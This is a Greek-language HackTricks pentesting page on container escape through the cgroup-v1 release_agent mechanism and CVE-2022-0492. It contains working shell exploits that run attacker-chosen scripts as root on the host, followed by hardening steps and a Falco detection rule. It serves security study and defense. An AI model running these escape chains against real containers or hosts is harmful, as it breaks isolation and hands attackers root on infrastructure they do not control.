# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Για περισσότερες λεπτομέρειες, ανατρέξτε στην** [**αρχική ανάρτηση του ιστολογίου**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Αυτό είναι απλώς μια περίληψη:

---

## Classic PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Το PoC εκμεταλλεύεται τη δυνατότητα **cgroup-v1** `release_agent`: όταν η τελευταία εργασία ενός cgroup που έχει `notify_on_release=1` τερματίσει, ο πυρήνας (στις **αρχικές ονομαστικές περιοχές στον οικοδεσπότη**) εκτελεί το πρόγραμμα του οποίου η διαδρομή αποθηκεύεται στο εγγράψιμο αρχείο `release_agent`. Επειδή αυτή η εκτέλεση συμβαίνει με **πλήρη δικαιώματα root στον οικοδεσπότη**, η απόκτηση δικαιωμάτων εγγραφής στο αρχείο είναι αρκετή για μια έξοδο από το κοντέινερ.

### Σύντομη, αναγνώσιμη διαδικασία

1. **Ετοιμάστε ένα νέο cgroup**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # ή –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Δείξτε το `release_agent` σε σενάριο ελεγχόμενο από τον επιτιθέμενο στον οικοδεσπότη**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Ρίξτε το payload**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Ενεργοποιήστε τον ειδοποιητή**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # προσθέτουμε τον εαυτό μας και τερματίζουμε αμέσως
cat /output                                  # τώρα περιέχει διαδικασίες του οικοδεσπότη
```

---

## Ευπάθεια πυρήνα 2022 – CVE-2022-0492

Τον Φεβρουάριο του 2022, οι Yiqi Sun και Kevin Wang ανακάλυψαν ότι **ο πυρήνας *δεν* επαλήθευε τα δικαιώματα όταν μια διαδικασία έγραφε στο `release_agent` στο cgroup-v1** (λειτουργία `cgroup_release_agent_write`).

Αποτελεσματικά **οποιαδήποτε διαδικασία που μπορούσε να τοποθετήσει μια ιεραρχία cgroup (π.χ. μέσω `unshare -UrC`) μπορούσε να γράψει μια αυθαίρετη διαδρομή στο `release_agent` χωρίς `CAP_SYS_ADMIN` στην *αρχική* ονομαστική περιοχή χρήστη**. Σε ένα κοντέινερ Docker/Kubernetes που εκτελείται με προεπιλεγμένη διαμόρφωση και δικαιώματα root, αυτό επέτρεψε:

* αναβάθμιση δικαιωμάτων σε root στον οικοδεσπότη; ↗
* έξοδο από το κοντέινερ χωρίς το κοντέινερ να είναι προνομιακό.

Η αδυναμία αποδόθηκε ως **CVE-2022-0492** (CVSS 7.8 / Υψηλό) και διορθώθηκε στις επόμενες εκδόσεις πυρήνα (και σε όλες τις επόμενες):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Διορθωτική δέσμευση: `1e85af15da28 "cgroup: Fix permission checking"`.

### Ελάχιστη εκμετάλλευση μέσα σε ένα κοντέινερ
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Αν ο πυρήνας είναι ευάλωτος, το δυαδικό αρχείο busybox από τον *host* εκτελείται με πλήρη δικαιώματα root.

### Σκληροποίηση & Μετριασμοί

* **Ενημερώστε τον πυρήνα** (≥ εκδόσεις παραπάνω). Η επιδιόρθωση απαιτεί τώρα `CAP_SYS_ADMIN` στο *αρχικό* namespace χρηστών για να γράψει στο `release_agent`.
* **Προτιμήστε το cgroup-v2** – η ενοποιημένη ιεραρχία **αφαίρεσε εντελώς τη δυνατότητα `release_agent`**, εξαλείφοντας αυτή την κατηγορία διαφυγών.
* **Απενεργοποιήστε τα unprivileged user namespaces** σε hosts που δεν τα χρειάζονται:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Υποχρεωτικός έλεγχος πρόσβασης**: Πολιτικές AppArmor/SELinux που αρνούνται `mount`, `openat` στο `/sys/fs/cgroup/**/release_agent`, ή αφαιρούν `CAP_SYS_ADMIN`, σταματούν την τεχνική ακόμη και σε ευάλωτους πυρήνες.
* **Read-only bind-mask** όλα τα αρχεία `release_agent` (παράδειγμα σεναρίου Palo Alto):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Ανίχνευση κατά την εκτέλεση

[`Falco`](https://falco.org/) περιλαμβάνει έναν ενσωματωμένο κανόνα από την έκδοση v0.32:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
Ο κανόνας ενεργοποιείται σε οποιαδήποτε προσπάθεια εγγραφής στο `*/release_agent` από μια διαδικασία μέσα σε ένα κοντέινερ που εξακολουθεί να διαθέτει `CAP_SYS_ADMIN`.

## Αναφορές

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – λεπτομερής ανάλυση και σενάριο μετριασμού.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
